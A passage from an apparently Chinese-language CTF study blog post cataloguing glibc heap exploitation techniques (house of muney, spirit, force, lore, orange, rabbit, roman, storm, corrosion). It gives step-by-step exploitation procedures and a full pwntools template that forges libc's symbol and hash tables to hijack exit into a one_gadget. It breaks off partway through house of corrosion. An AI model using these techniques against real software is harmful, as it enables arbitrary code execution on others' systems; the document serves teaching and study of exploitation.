class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="comment">// 第一个参数是字符串地址，根据符号表和字符串表得到的</span></span><br><span class="line">	<span class="comment">// 第二个参数是link_map</span></span><br><span class="line">	<span class="comment">// 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表</span></span><br><span class="line">	<span class="comment">// 第四个参数是scope，表示查找的范围</span></span><br><span class="line">	<span class="comment">// 第五个参数是版本信息</span></span><br><span class="line">	<span class="comment">// 后面的参数都是固定的</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">	<span class="built_in">THREAD_GSCOPE_RESET_FLAG</span> ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">	 of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">	 offset.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (result,</span><br><span class="line">				   <span class="built_in">SYMBOL_ADDRESS</span> (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">	 address) is also known.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (l, <span class="built_in">SYMBOL_ADDRESS</span> (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = <span class="built_in">elf_machine_plt_value</span> (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (<span class="built_in">ELFW</span>(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = <span class="built_in">elf_ifunc_invoke</span> (<span class="built_in">DL_FIXUP_VALUE_ADDR</span> (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">	<span class="comment">// 修正got表条目</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">elf_machine_fixup_plt</span> (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只了解了大概流程</p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p><code>ptmalloc</code> 堆分配器在分配超大内存 <code>&gt; 128K</code> 的时候，会调用 <code>mmap</code> 申请系统内存，此时申请到的内存一般位于 <code>libc.so.6</code> 映射的内存地址的低地址处。<code>house of muney</code> 的核心在于修改 <code>mmap</code> 内存的 <code>size</code> 大小，使其能把 <code>libc.so.6</code> 的符号表、哈希表等数据所在的地址空间也释放掉。然后再把这一片空间给申请回来，就能伪造符号表、哈希表，那么在解析函数实际地址的时候就能控制其解析为任意地址，进而控制程序执行流。</p>
<ol>
<li><code>A = mmap(addr=NULL, length=0x1000,...)</code></li>
<li>修改 <code>A</code> 的 <code>size</code>，为 <code>0x1000 + XXX</code></li>
<li><code>free(A)</code>，实际执行的是：<code>munmap(A, 0x1000 + XXX)</code>，就可以偷取 <code>glibc</code> 的内存</li>
<li><code>mmap(addr=NULL, length=0x1000 + XXX, ... )</code>，然后输入数据，就可以控制 “偷去” 的内存的内容</li>
<li>在进行符号解析的时候，进行任意函数调用</li>
</ol>
<p>需要伪造的结构有：</p>
<ol>
<li><strong>bitmask_word</strong></li>
<li><strong>bucket</strong></li>
<li><strong>hasharr</strong>，需要多伪造几个，并不是第一个就满足条件</li>
<li><strong>target symbol -&gt;st_value</strong>，符号表中，除了st_value修改为目标地址外，其他成员建议保持不变</li>
</ol>
<p>简单来说，就是伪造符号表，让初次调用funcA时的真实地址，解析成funcB达到任意代码执行的效果</p>
<p>给出模板</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x40000</span> - <span class="number">0x2000</span>)   </span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">0</span>, -<span class="number">8</span>, p64(<span class="number">0x41002</span> + <span class="number">0x5000</span> + <span class="number">0x4000</span>))  <span class="comment">#修改size，以让mmap可以申请到libc段上的空间（malloc过大的chunk会重新申请一个段来存储chunk，该段与libc接近）</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Prepare offsets and gadgets</span></span><br><span class="line">base_off = <span class="number">0x7dff0</span>                           <span class="comment">#mmap段与libc_base的差值</span></span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">gnu_hash_section = libc.get_section_by_name(<span class="string">&#x27;.gnu.hash&#x27;</span>)</span><br><span class="line">dynsym_section = libc.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>)</span><br><span class="line">dynstr_section = libc.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Calculate hash and offsets</span></span><br><span class="line">namehash = gnu_hash_section.gnu_hash(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">bloom_off = gnu_hash_section[<span class="string">&#x27;sh_addr&#x27;</span>] + <span class="number">4</span> * gnu_hash_section._wordsize</span><br><span class="line">bucket_off = bloom_off + gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>] * gnu_hash_section._xwordsize</span><br><span class="line"></span><br><span class="line">bloom_elem_idx = <span class="built_in">int</span>(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>]</span><br><span class="line">bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize</span><br><span class="line">bloom_elem_val = gnu_hash_section.params[<span class="string">&#x27;bloom&#x27;</span>][bloom_elem_idx]</span><br><span class="line"></span><br><span class="line">bucket_elem_idx = namehash % gnu_hash_section.params[<span class="string">&#x27;nbuckets&#x27;</span>]</span><br><span class="line">bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize</span><br><span class="line">bucket_elem_val = gnu_hash_section.params[<span class="string">&#x27;buckets&#x27;</span>][bucket_elem_idx]</span><br><span class="line"></span><br><span class="line">hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[<span class="string">&#x27;symoffset&#x27;</span>]) * gnu_hash_section._wordsize</span><br><span class="line">sym_off = dynsym_section[<span class="string">&#x27;sh_offset&#x27;</span>] + bucket_elem_val * dynsym_section[<span class="string">&#x27;sh_entsize&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Prepare the new symbol entry for `exit`</span></span><br><span class="line">sym_value = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">sym_value += p32(libc.search(<span class="string">b&#x27;exit\x00&#x27;</span>).__next__() - dynstr_section[<span class="string">&#x27;sh_offset&#x27;</span>])  <span class="comment"># st_name </span></span><br><span class="line">sym_value += p8(<span class="number">0x12</span>)  <span class="comment"># st_info</span></span><br><span class="line">sym_value += p8(<span class="number">0</span>)  <span class="comment"># st_other</span></span><br><span class="line">sym_value += p16(<span class="number">1</span>)  <span class="comment"># st_shndx</span></span><br><span class="line">sym_value += p64(one_gadget)  <span class="comment"># st_value  #目标地址----------------------</span></span><br><span class="line">sym_value += p64(<span class="number">8</span>)  <span class="comment"># st_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Edit the heap to overwrite the hash table and symbol table</span></span><br><span class="line">edit(<span class="number">0</span>, base_off + bloom_elem_off, p64(bloom_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + bucket_elem_off, p32(bucket_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + hasharr_off, p32(namehash))</span><br><span class="line">edit(<span class="number">0</span>, base_off + sym_off, sym_value)</span><br><span class="line">dbg()</span><br><span class="line"><span class="comment"># Step 6: Trigger the exploit</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;option:&quot;</span>, <span class="string">b&quot;5&quot;</span>)   <span class="comment">#首次调用exit函数</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p>
<h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
</ul>
<h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用堆溢出，修改 <code>chunk size</code>，伪造出 <code>fake chunk</code>，然后通过堆的释放和排布，控制 <code>fake chunk</code>。<code>house of spirit</code> 的操作思路有很多，比如可以按如下操作进行利用：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C、chunk D</code></li>
<li>对 <code>A</code> 写操作的时候溢出，修改 <code>B</code> 的 <code>size</code> 域，使其能包括 <code>chunk C</code></li>
<li>释放 <code>B</code>，然后把 <code>B</code> 申请回来，再释放 <code>C</code>，则可以通过读写 <code>B</code> 来控制 <code>C</code> 的内容</li>
</ul>
<h3 id="相关技巧-1"><a href="#相关技巧-1" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>起初 <code>house of spirit</code> 主要是针对 <code>fastbin</code>，后来引入了 <code>tcachebin</code> 后，也可以使用 <code>tcachebin</code> 版本的 <code>house of spirit</code>。利用方法与 <code>fastbin</code> 场景下类似，注意好不同版本下的检查条件即可。</p>
<h3 id="利用效果-1"><a href="#利用效果-1" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</li>
</ul>
<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写 <code>top_chunk</code></p>
<h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>——<code>2.28</code></li>
<li>可分配任意大小的 <code>chunk</code></li>
<li>需要泄露或已知地址</li>
</ul>
<h3 id="利用原理-2"><a href="#利用原理-2" class="headerlink" title="利用原理"></a>利用原理</h3><p>对 <code>top_chunk</code> 的利用，过程如下：</p>
<ul>
<li>申请 <code>chunk A</code></li>
<li>写 <code>A</code> 的时候溢出，修改 <code>top_chunk</code> 的 <code>size</code> 为很大的数</li>
<li>分配很大的 <code>chunk</code> 到任意已知地址</li>
</ul>
<h3 id="相关技巧-2"><a href="#相关技巧-2" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>注意，在 <code>glibc-2.29</code> 后加入了检测，<code>house of force</code> 基本失效：</p>
<p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250217172739313.png" alt="image-20250217172739313"></p>
<h3 id="利用效果-2"><a href="#利用效果-2" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
<li>任意地址读写</li>
</ul>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p>
<h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>需要泄露或已知地址</li>
</ul>
<h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><p>控制 <code>smallbin</code> 的 <code>bk</code> 指针，示例如下：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C</code>，其中 <code>chunk B</code> 大小位于 <code>smallbin</code></li>
<li>释放 <code>B</code>，申请更大的 <code>chunk D</code>，使得 <code>B</code> 进入 <code>smallbin</code></li>
<li>写 <code>A</code>，溢出修改 <code>B</code> 的 <code>bk</code>，指向地址 <code>X</code>，这里有 <code>fake chunk</code></li>
<li>布置 <code>X-&gt;fd == &amp;B</code></li>
<li>分配两次后即可取出位于 <code>X</code> 地址处的 <code>fake chunk</code></li>
</ul>
<h3 id="相关技巧-3"><a href="#相关技巧-3" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>在引入了 <code>tcache stash unlink</code> 的时候，需要注意绕过：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			<span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。(<strong>对应tcache为空或者满</strong>)</p>
<p>实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 <code>fastbin/tcachebin</code>。</p>
<h3 id="利用效果-3"><a href="#利用效果-3" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
<li>任意地址读写</li>
</ul>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p>
<h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>——<code>2.26</code></li>
<li><strong>没有 <code>free</code></strong></li>
<li>可以 <code>unsortedbin attack</code></li>
</ul>
<h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of orange</code> 可以说是开启了堆与 <code>IO</code> 组合利用的先河，是非常经典、漂亮、精彩的利用组合技。利用过程还要结合 <code>top_chunk</code> 的性质，利用过程如下：</p>
<p><strong>stage1</strong></p>
<ul>
<li>申请 <code>chunk A</code>，假设此时的 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xWXYZ</code></li>
<li>写 <code>A</code>，溢出修改 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xXYZ</code>（需要满足页对齐的检测条件）</li>
<li>申请一个大于 <code>0xXYZ</code> 大小的 <code>chunk</code>，此时 <code>top_chunk</code> 会进行 <code>grow</code>，并将原来的 <code>old top_chunk</code> 释放进入 <code>unsortedbin</code></li>
</ul>
<p><strong>stage2</strong></p>
<ul>
<li>溢出写 <code>A</code>，修改处于 <code>unsortedbin</code> 中的 <code>old top_chunk</code>，修改其 <code>size</code> 为 <code>0x61</code>，其 <code>bk</code> 为 <code>&amp;_IO_list_all-0x10</code>，同时伪造好 <code>IO_FILE</code> 结构</li>
<li>申请非 <code>0x60</code> 大小的 <code>chunk</code> 的时候，首先触发 <code>unsortedbin attack</code>，将<code>_IO_list_all</code> 修改为 <code>main_arena+88</code>，然后 <code>unsortedbin chunk</code> 会进入到 <code>smallbin</code>，大小为 <code>0x60</code>；接着遍历 <code>unsortedbin</code> 的时候触发了 <code>malloc_printerr</code>，然后调用链为：<code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code>，调用到伪造的 <code>vtable</code> 里面的函数指针（也可以exit调用之类的，感觉不一定局限于<code>malloc_printerr</code>）</li>
</ul>
<h3 id="相关技巧-4"><a href="#相关技巧-4" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>在 <code>glibc-2.24</code> 后加入了 <code>vtable</code> 的 <code>check</code>，不能任意地址伪造 <code>vatble</code> 了，但是可以利用 <code>IO_str_jumps</code> 结构进行利用。</li>
<li>在 <code>glibc-2.26</code> 后，<code>malloc_printerr</code> 不再刷新 <code>IO</code> 流了，所以该方法失效</li>
<li>由于<code>_mode</code> 的正负性是随机的，影响判断条件，大概有 <code>1/2</code> 的概率会利用失败，多试几次就好</li>
</ul>
<h3 id="利用效果-4"><a href="#利用效果-4" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意函数执行</li>
<li>任意命令执行</li>
</ul>
<h2 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h2><h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写、<code>use after free</code>、<code>edit after free</code></p>
<h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>——<code>2.26</code></li>
<li>超过 <code>0x400</code> 大小的堆分配</li>
<li>可以写 <code>fastbin</code> 的 <code>fd</code> 或者 <code>size</code> 域</li>
</ul>
<h3 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h3><p>该利用技巧的核心是 <code>malloc_consolidate</code> 函数，当检测到有 <code>fastbin</code> 的时候，会取出每一个 <code>fastbin chunk</code>，将其放置到 <code>unsortedbin</code> 中，并进行合并。以修改 <code>fd</code> 为例，利用过程如下：</p>
<ul>
<li>申请 <code>chunk A</code>、<code>chunk B</code>，其中 <code>chunk A</code> 的大小位于 <code>fastbin</code> 范围</li>
<li>释放 <code>chunk A</code>，使其进入到 <code>fastbin</code></li>
<li>利用 <code>use after free</code>，修改 <code>A-&gt;fd</code> 指向地址 <code>X</code>，需要伪造好 <code>fake chunk</code>，使其不执行 <code>unlink</code> 或者绕过 <code>unlink</code></li>
<li>分配足够大的 <code>chunk</code>，或者释放 <code>0x10000</code> 以上的 <code>chunk</code>，只要能触发 <code>malloc_consolidate</code> 即可</li>
<li>此时 <code>fake chunk</code> 被放到了 <code>unsortedbin</code>，或者进入到对应的 <code>smallbin/largebin</code></li>
<li>取出 <code>fake chunk</code> 进行读写即可</li>
</ul>
<h3 id="相关技巧-5"><a href="#相关技巧-5" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li><code>2.26</code> 加入了 <code>unlink</code> 对 <code>presize</code> 的检查</li>
<li><code>2.27</code> 加入了 <code>fastbin</code> 的检查</li>
</ul>
<p>抓住重点：<code>house of rabbit</code> 是对 <code>malloc_consolidate</code> 的利用。因此，不一定要按照原作者的思路来，他的思路需要满足的条件太多了。</p>
<h3 id="利用效果-5"><a href="#利用效果-5" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
<li>任意地址读写</li>
</ul>
<h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h2><h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>use after free</code>、堆溢出</p>
<h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>——<code>2.29</code></li>
<li>可以 <code>use after edit</code></li>
<li>不需要泄露地址</li>
<li>需要部分字节</li>
</ul>
<h3 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h3><ul>
<li><p>申请chunkA，chunkB，chunkC，chunkD，chunkE，其中chunkB的大小为0xd0</p>
</li>
<li><p>在chunkB中写入<code>&quot;A&quot;*0x68+p64(0x61)</code></p>
</li>
<li><p>释放掉B，B进入unsortedbin，然后chunkA溢出修改chunkB的size为0x71，此时chunkB的fd和bk都是main_arena+88</p>
</li>
<li><p>然后将chunkD和chunkE都释放进fastbin中，size域为0x70的</p>
</li>
<li><p>然后利用uaf部分地址写，将chunkB伪造的chunk链入fastbin中</p>
<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x555555757160 —▸ <span class="number">0</span>x555555757020 —▸ <span class="number">0</span>x7ffff7dd1b78 (main_arena+<span class="number">88</span>) ◂— <span class="number">0</span>x7ffff7dd1b78</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后修改chunkB的fd的低2字节，使B-&gt;fd&#x3D; malloc_hook - 0x23</p>
</li>
<li><p>然后分配3个chunk的size为0x70的就能获得这个fake chunk了</p>
</li>
<li><p>然后在之前就要多分配一个0x70大小的chunk此时来通过uaf修复fastbin（注意堆风水）</p>
</li>
<li><p>之后通过unsortedbin attack来修改malloc_hook为一个libcbase+0xXXXX</p>
</li>
<li><p>之后部分写malloc_hook的低字节使其偏向onegadget，需要爆破</p>
</li>
</ul>
<h3 id="相关技巧-6"><a href="#相关技巧-6" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul>
<li>使用 <code>house of roman</code> 的时候，需要采用多线程爆破</li>
<li>可以使用其他方法代替，比如先攻击 <code>stdout</code> 泄露地址，使得爆破的成本降低</li>
</ul>
<h3 id="利用效果-6"><a href="#利用效果-6" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>执行 <code>one_gadget</code></li>
<li>绕过 <code>ASLR</code></li>
</ul>
<h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p>
<h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>——<code>2.28</code> 因为2.29的unsortedbin attack失效</li>
<li>可以进行 <code>unsortedbin attack</code></li>
<li>可以进行 <code>largebin attack</code>，修改 <code>bk</code> 和 <code>bk_nextsize</code></li>
<li>可以分配 <code>0x50</code> 大小的 <code>chunk</code></li>
</ul>
<h3 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of storm</code> 也是一款组合技，利用开启了 <code>PIE</code> 的 <code>x64</code> 程序的堆地址总是 <code>0x55xxxx...</code> 或者 <code>0x56xxxx...</code> 开头这一特性，使用一次 <code>largebin attack</code> 写两个堆地址，使用一次 <code>unsortedbin attack</code> 写一次 <code>libc</code> 地址，可以实现任意地址分配。虽然 <code>house of storm</code> 最后能达到任意地址分配，但是由于其所需的条件比较多，一般可以用其他更简便的堆利用技术代替。利用思路如下：</p>
<ul>
<li>进行一次 <code>unsortedbin attack</code>，其 <code>bk</code> 修改为 <code>addr</code></li>
<li>进行一次 <code>largebin attack</code>，其 <code>bk</code> 修改为 <code>addr+0x10</code>，<code>bk_nextsize</code> 修改为 <code>addr-0x20+3</code></li>
<li>申请 <code>0x50</code> 大小的 <code>chunk</code> 即可申请到 <code>addr</code> 处</li>
</ul>
<h3 id="相关技巧-7"><a href="#相关技巧-7" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>需要注意的有：</p>
<ul>
<li>该方法成功的几率是 <code>50%</code>，因为 <code>0x55</code> 会触发 <code>assert</code> 断言，<code>0x56</code> 才能成功</li>
<li>申请 <code>addr</code> 处的 <code>chunk</code> 的时候需要从 <code>unsortedbin</code> 里面取</li>
</ul>
<h3 id="利用效果-7"><a href="#利用效果-7" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
</ul>
<h2 id="house-of-corrosion"><a href="#house-of-corrosion" class="headerlink" title="house of corrosion"></a>house of corrosion</h2><h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code></p>
<h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>任意大小分配</li>
<li>可以修改 <code>global_max_fast</code></li>
<li>不需要泄露地址</li>
</ul>
<h3 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h3><p>一个非常 <code>tricky</code> 的方法，可以绕过 <code>aslr</code>，不需要泄露地址都能达成 <code>rce</code>，可以很很多方法结合起来应用。先说利用原理：</p>
<ul>
<li>使用 <code>unsortedbin attack/largebin attack</code> 等方法，成功修改 <code>global_max_fast</code> 的值为很大的值。如果使用 <code>unsortedbin attack</code>，不需要泄露地址，爆破 <code>1/16</code> 即可</li>
<li>申请任意大小的 <code>chunk</code>，这些 <code>chunk</code> 都会被视为 <code>fastbin chunk</code>，然后利用这些 <code>chunk</code> 来进行读和写</li>
</ul>
<p>此时的计算公式为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (chunk addr - &amp;main_arena.fastbinsY) x <span class="number">2</span> + <span class="number">0x20</span></span><br></pre></td></tr></table></figure>

<p><strong>原语1：</strong>（任意地址任意写）</p>
<ul>
<li><p>假如我们要修改的地址为0x2000上的数据，此时我们的main_arena.fatbinsY的地址是0x1000</p>
</li>
<li><p>计算size&#x3D;(0x2000-0x1000)*2+0x20&#x3D;0x2020，所以就要先事先chunkA&#x3D;malloc(0x2018)</p>
</li>
<li><p>之后通过unsortedbin attack或者largebin attack，改写global_max_fast</p>
</li>
